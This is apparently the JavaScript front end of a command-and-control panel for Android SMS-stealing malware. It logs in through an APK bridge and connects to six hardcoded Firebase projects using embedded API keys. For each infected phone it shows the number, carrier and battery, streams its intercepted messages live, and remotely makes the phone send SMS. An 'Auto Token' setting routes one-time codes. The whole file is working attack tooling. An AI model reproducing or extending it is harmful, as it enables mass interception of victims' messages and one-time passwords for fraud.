var AUTH_URL='';
var SMS_TOKEN_URL='';
var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
var activeListeners={}, window_sms=[];
var ACTIVE_FB_KEY='rbl_active_fb_m';
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
var SUMMARY_NODES=['devices_status','clients'];
var DEVICE_NODES=['devices','users','clients_list','online_devices'];

var DEFAULT_FIREBASES=[
  {id:'rabel_raand',name:'Rebel',schema:'rabel',apiKey:'AIzaSyB5Fmk4HgxDLmkfSegOW2TBdtJeCpM-nuw',authDomain:'rabel-raand.firebaseapp.com',databaseURL:'https://rabel-raand-default-rtdb.firebaseio.com',projectId:'rabel-raand',storageBucket:'rabel-raand.firebasestorage.app',messagingSenderId:'574630053774',appId:'1:574630053774:android:aa7475de67c935821806df'},
  {id:'monster_green_c5e81',name:'Monster Green',schema:'rabel',apiKey:'AIzaSyBspKFI_F7hB-5hHJI0203786vXuCMMbM8',authDomain:'monster-green-c5e81.firebaseapp.com',databaseURL:'https://monster-green-c5e81-default-rtdb.firebaseio.com',projectId:'monster-green-c5e81',storageBucket:'monster-green-c5e81.firebasestorage.app',messagingSenderId:'411242045978',appId:'1:411242045978:android:1748043e0e030b348067a3'},
  {id:'pmfg_ccccc',name:'PMFG',schema:'spinplay',apiKey:'AIzaSyBq_UQz4RtTsomqsWLA99ilqvrK14Okh9w',authDomain:'pmfg-ccccc.firebaseapp.com',databaseURL:'https://pmfg-ccccc-default-rtdb.firebaseio.com',projectId:'pmfg-ccccc'},
  {id:'spinplay99',name:'SpinPlay99',schema:'spinplay',apiKey:'AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I',authDomain:'spinplay99.firebaseapp.com',databaseURL:'https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'spinplay99',storageBucket:'spinplay99.firebasestorage.app',messagingSenderId:'8121733414',appId:'1:8121733414:web:04b9ae5df1b6bc413e31e7'},
  {id:'nsx1_7f7aa',name:'NSX1',schema:'rabel',apiKey:'AIzaSyBnfbREOJVIVrN2K7KJX4TTPbKcMIFasDQ',authDomain:'nsx1-7f7aa.firebaseapp.com',databaseURL:'https://nsx1-7f7aa-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'nsx1-7f7aa',storageBucket:'nsx1-7f7aa.firebasestorage.app',messagingSenderId:'1025305009086',appId:'1:1025305009086:android:b3c3d28d5f6bf44f2b77ef'},
  {id:'stormapk_9edea',name:'Storm APK',schema:'rabel',apiKey:'AIzaSyCuFRrF3_yxait_oOFkDxjdrsZkwno_Uy8',authDomain:'stormapk-9edea.firebaseapp.com',databaseURL:'https://stormapk-9edea-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'stormapk-9edea',storageBucket:'stormapk-9edea.firebasestorage.app',messagingSenderId:'353810391693',appId:'1:353810391693:android:291dcbff91823c3866f8c4'}
];

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function getFilteredDevs(){return activeFbId?allDevs.filter(function(d){return d.fbId===activeFbId;}):allDevs;}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}

function loadFirebaseConfigs(){
  try{
    var s=localStorage.getItem('rbl_firebase_list');
    if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
      DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
      return p;
    }}
  }catch(e){}
  return DEFAULT_FIREBASES.slice();
}
function initFirebaseInstance(cfg){
  var appName='mfb_'+cfg.id,db=null;
  if(cfg.apiKey){
    try{
      var exists=false;firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists)firebase.initializeApp({apiKey:cfg.apiKey,authDomain:cfg.authDomain||'',databaseURL:cfg.databaseURL,projectId:cfg.projectId||cfg.id,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''},appName);
      db=firebase.app(appName).database();
    }catch(e){}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
  firebaseInstances.push(inst);return inst;
}
function initFirebase(){
  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
  firebaseConfigs.forEach(initFirebaseInstance);
  try{activeFbId=localStorage.getItem(ACTIVE_FB_KEY)||'';}catch(e){}
  if(!activeFbId&&firebaseConfigs.length){var r=firebaseConfigs.find(function(c){return c.id==='rabel_raand';});activeFbId=r?r.id:firebaseConfigs[0].id;}
  updateFbUi();
}
initFirebase();

function updateFbUi(){
  var inst=getFbInstance(activeFbId);
  var name=inst?inst.name:'—';
  document.getElementById('fbChip').textContent=name;
  document.getElementById('moreFbName').textContent=name;
  document.getElementById('hdrSub').textContent=inst?(getFilteredDevs().length+' devices · '+name):'No Firebase';
  var html=firebaseConfigs.map(function(c){
    var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
    return '<div class="fb-option'+(c.id===activeFbId?' active':'')+'" onclick="switchFirebase(\''+c.id+'\')"><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices</div></div>';
  }).join('');
  document.getElementById('fbSheetList').innerHTML=html;
}
function switchFirebase(id){
  if(!getFbInstance(id))return;
  activeFbId=id;try{localStorage.setItem(ACTIVE_FB_KEY,id);}catch(e){}
  if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
  updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();
  closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
}
function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}

function getPhoneFromRecord(s){
  if(!s)return'';
  if(s.mobNo)return String(s.mobNo).trim();
  if(s.sims&&s.sims.length)for(var i=0;i<s.sims.length;i++){var p=s.sims[i]&&(s.sims[i].phoneNumber||s.sims[i].number);if(p)return String(p).trim();}
  return String(s.phone_number||s.phone||s.mobile||'').trim();
}
function resolveOnlineStatus(s,fbId){
  var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
  if(schema==='rabel')return s.status===true||s.online===true;
  if(s.online_status===true)return true;if(s.online_status===false)return false;
  return s.online===true||s.status==='online'||s.status===true;
}
function normalizeClientRecord(raw){
  if(!raw||typeof raw!=='object')return null;
  if(raw.password||raw.Pass)return null;
  if(raw.modelName||raw.deviceId||raw.mobNo)return{
    name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||'',
    online:raw.status===true,battery:parseInt(raw.battery,10)||0,
    network:raw.service_provider||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
  };
  return{name:raw.name||raw.device_model||'Unknown',brand:raw.brand||'',android:raw.android||'',
    online_status:raw.online_status,online:raw.online,status:raw.status,
    battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
    sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)};
}
function ingestDeviceData(fbId,node,devId,data){
  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
  norm._node=node;norm._fbId=fbId;
  clientsRawMap[makeDevKey(fbId,devId)]=Object.assign({},clientsRawMap[makeDevKey(fbId,devId)]||{},norm);
}
function mergeSummaryNode(fbId,node,raw){
  if(!raw||typeof raw!=='object')return;
  Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
}
function processClientsData(){
  allDevs=[];
  var raw={};Object.keys(clientsRawMap).forEach(function(k){if(!activeFbId||k.indexOf(activeFbId+'::')===0)raw[k]=clientsRawMap[k];});
  Object.keys(raw).forEach(function(k){
    var s=raw[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
    var on=resolveOnlineStatus(s,p.fbId);
    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
      name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0});
  });
  allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
  if(!selDev&&allDevs.length)selDev=allDevs[0].id;
  renderDevices();updateStats();updateFbUi();
}
function updateStats(){
  var l=getFilteredDevs();
  document.getElementById('stTotal').textContent=l.length;
  document.getElementById('stOnline').textContent=l.filter(function(d){return d.status==='online';}).length;
  document.getElementById('stOffline').textContent=l.filter(function(d){return d.status==='offline';}).length;
}
function fetchSummaryNode(inst,node){
  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
}
function discoverInstance(inst){
  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
    if(!roots||typeof roots!=='object')return;
    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
    var tasks=[];
    nodes.forEach(function(n){
      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
      else if(n==='devices')tasks.push(fetchSummaryNode(inst,n));
    });
    return Promise.all(tasks);
  });
}
function attachLive(inst){
  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
  ['clients','devices_status'].forEach(function(node){
    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
  });
}
function fetchAllData(){
  document.getElementById('hdrSub').textContent='Syncing...';
  firebaseInstances.forEach(attachLive);
  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
    processClientsData();
    document.getElementById('hdrSub').textContent=getFilteredDevs().length+' devices';
    if(selDev)loadSmsForDevice();
  });
}
function refreshData(){toast('Refreshing...',true);fetchAllData();}

function renderDevices(){
  var q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
  var el=document.getElementById('devList');
  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📡</div>No devices yet<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';return;}
  el.innerHTML=list.map(function(d){
    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
      '<div class="dev-bar"></div><div class="dev-body">'+
      '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
      '<div class="dev-meta">'+esc(d.name)+' · '+esc(d.rawId.substring(0,14))+'</div>'+
      '<div class="dev-chips"><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
      '</div></div>';
  }).join('');
}
function selectDevice(id){
  selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();
  switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
}

function renderDeviceView(){
  var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
  if(!d){empty.classList.remove('hidden');hero.classList.add('hidden');return;}
  empty.classList.add('hidden');hero.classList.remove('hidden');
  hero.innerHTML='<div class="hero-card">'+
    '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+'</div>'+
    '<div class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</div>'+
    '<div class="hero-grid">'+
    '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">SMS</div><div class="hero-val">'+d.smsCount+'</div></div>'+
    '</div><div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
}
function updateSendForm(){
  var d=getSelDev();
  document.getElementById('sendEmpty').classList.toggle('hidden',!!d);
  document.getElementById('sendForm').classList.toggle('hidden',!d);
}

function clearListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L.timer)clearInterval(L.timer);
    else if(L.db&&L.ref){L.ref.off('value',L.h);L.ref.off('child_added',L.h);}
  });
  activeListeners={};
}
function loadSmsForDevice(){
  var d=getSelDev();if(!d)return;
  document.getElementById('smsEmpty').classList.add('hidden');
  clearListeners();
  var inst=getFbInstance(d.fbId);
  if(inst&&inst.schema==='rabel'){
    var path='messages/'+d.rawId;
    if(inst.db){
      var ref=inst.db.ref(path).limitToLast(80);
      var h=function(s){renderSmsFromData(s.val());};
      ref.on('value',h);activeListeners[d.id]={db:inst.db,ref:ref,h:h};
    }else{
      var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(renderSmsFromData);};
      tick();activeListeners[d.id]={timer:setInterval(tick,3000)};
    }
  }else{
    var p2=(d.deviceNode||'devices')+'/'+d.rawId+'/new_sms';
    var tick2=function(){restJson(inst.restUrl+'/'+p2+'.json').then(renderSmsFromData);};
    tick2();activeListeners[d.id]={timer:setInterval(tick2,3000)};
  }
}
function smsAsList(raw){
  if(!raw)return[];
  if(Array.isArray(raw))return raw.filter(function(x){return x&&typeof x==='object';});
  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
}
function normalizeSms(m){
  if(!m||typeof m!=='object')return null;
  var body=m.body||m.message||m.text||m.content||'';
  if(!body)return null;
  return{address:m.address||m.sender||m.from||m.number||'?',body:body,
    date_readable:m.date_readable||m.dateTime||m.time||'—',
    type:String(m.type||m.direction||'inbox').toLowerCase()};
}
function renderSmsFromData(data){
  var list=smsAsList(data).map(normalizeSms).filter(Boolean);
  list.sort(function(a,b){return String(b.date_readable).localeCompare(String(a.date_readable));});
  window_sms=list.slice(0,60);renderSms();
}
function renderSms(){
  var d=getSelDev(),el=document.getElementById('smsList');
  if(!d){document.getElementById('smsEmpty').classList.remove('hidden');el.innerHTML='';return;}
  if(!window_sms.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
  el.innerHTML=window_sms.map(function(s){
    var out=s.type==='sent'||s.type==='outbox';
    return '<div class="sms-bubble '+(out?'out':'in')+'">'+
      '<div class="sms-from">'+esc(s.address)+(out?'':'')+'</div>'+
      esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
  }).join('');
}

function sendSms(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var inst=getFbInstance(d.fbId),to=document.getElementById('sendTo').value.trim(),msg=document.getElementById('sendMsg').value.trim();
  if(!to||!msg){toast('Fill number and message',false);return;}
  document.getElementById('sendStatus').textContent='Sending...';
  var path=inst.restUrl+'/clients/'+encodeURIComponent(d.rawId)+'/webhookEvent/sendSms.json';
  var payload={to:to,message:msg,from:1,isSended:false};
  if(inst.schema!=='rabel')path=inst.restUrl+'/'+(d.deviceNode||'devices')+'/'+encodeURIComponent(d.rawId)+'/manual_commands/send_sms.json';
  fetch(path,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
    if(r.ok){document.getElementById('sendStatus').textContent='✅ Sent';document.getElementById('sendMsg').value='';toast('SMS sent',true);}
    else{document.getElementById('sendStatus').textContent='❌ Failed';toast('Send failed',false);}
  }).catch(function(){document.getElementById('sendStatus').textContent='❌ Error';toast('Network error',false);});
}

function switchTab(name,btn){
  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
  document.getElementById('screen-'+name).classList.add('active');
  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
  if(btn)btn.classList.add('active');
  if(name==='sms'&&selDev)loadSmsForDevice();
  if(name==='device')renderDeviceView();
  if(name==='send')updateSendForm();
}

/* AUTH — built into APK (RebelAndroid bridge, no PHP) */
function parseJson(s){try{return JSON.parse(s);}catch(e){return null;}}
function authFetch(body){
  body=body||{};
  return new Promise(function(resolve){
    if(!window.RebelAndroid){resolve({ok:false,data:{ok:false,error:'Not in APK'}});return;}
    try{
      if(body.action==='login'){
        var j=parseJson(RebelAndroid.login(body.key||''));
        resolve({ok:!!(j&&j.ok),data:j||{ok:false,error:'Invalid key'}});
      }else if(body.action==='check'){
        var c=parseJson(RebelAndroid.checkSession());
        resolve({ok:!!(c&&c.ok),data:c||{ok:false}});
      }else if(body.action==='logout'){
        RebelAndroid.logout();
        resolve({ok:true,data:{ok:true}});
      }else resolve({ok:false,data:{ok:false}});
    }catch(e){resolve({ok:false,data:{ok:false,error:'Auth error'}});}
  });
}
function getSession(){try{return JSON.parse(localStorage.getItem('rbl_session')||sessionStorage.getItem('rbl_session')||'null');}catch(e){return null;}}
function unlockApp(token,exp,remember){
  var s={token:token,exp:exp||0};
  if(remember)localStorage.setItem('rbl_session',JSON.stringify(s));else sessionStorage.setItem('rbl_session',JSON.stringify(s));
  document.getElementById('loginScreen').classList.add('hidden');
  document.getElementById('appShell').classList.remove('hidden');
  if(!panelReady){panelReady=true;fetchAllData();loadAutoTokenState();}
}
function doLogin(){
  var key=(document.getElementById('loginKey').value||'').trim().toUpperCase();
  if(!key){document.getElementById('loginErr').textContent='Enter access key';document.getElementById('loginErr').style.display='block';return;}
  document.getElementById('loginBtn').disabled=true;
  authFetch({action:'login',key:key}).then(function(res){
    document.getElementById('loginBtn').disabled=false;
    if(res.ok&&res.data&&res.data.ok){unlockApp(res.data.token,res.data.expires,document.getElementById('rememberMe').checked);return;}
    document.getElementById('loginErr').textContent=res.data&&res.data.error||'Invalid key';
    document.getElementById('loginErr').style.display='block';
  });
}
function doLogout(){
  if(window.RebelAndroid)RebelAndroid.logout();
  localStorage.removeItem('rbl_session');sessionStorage.removeItem('rbl_session');
  location.reload();
}
document.getElementById('loginKey').addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');});

/* AUTO TOKEN — stored inside APK */
var _autoTokenOn=false;
function smsTokenFetch(body){
  return new Promise(function(resolve){
    if(!window.RebelAndroid){resolve({ok:false});return;}
    try{
      body=body||{};
      if(body.action==='get')resolve(parseJson(RebelAndroid.getAutoTokenConfig())||{ok:false});
      else resolve(parseJson(RebelAndroid.saveAutoTokenConfig(JSON.stringify(body)))||{ok:false});
    }catch(e){resolve({ok:false});}
  });
}
function loadAutoTokenState(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok&&d.config){_autoTokenOn=!!d.config.enabled;document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);}
  });
}
function toggleAutoToken(){
  _autoTokenOn=!_autoTokenOn;
  document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
  smsTokenFetch({action:'save',enabled:_autoTokenOn}).then(function(){toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);});
}
function useSelForAutoToken(){
  var d=getSelDev();if(!d){toast('Select device on Home',false);return;}
  var inst=getFbInstance(d.fbId);
  smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
    toast('Auto SMS device set',true);
  });
}

/* BOOT */
(function(){
  if(window.RebelAndroid){
    var c=parseJson(RebelAndroid.checkSession());
    if(c&&c.ok){var s=getSession();if(s&&s.token)unlockApp(s.token,s.exp,true);}
  }
})();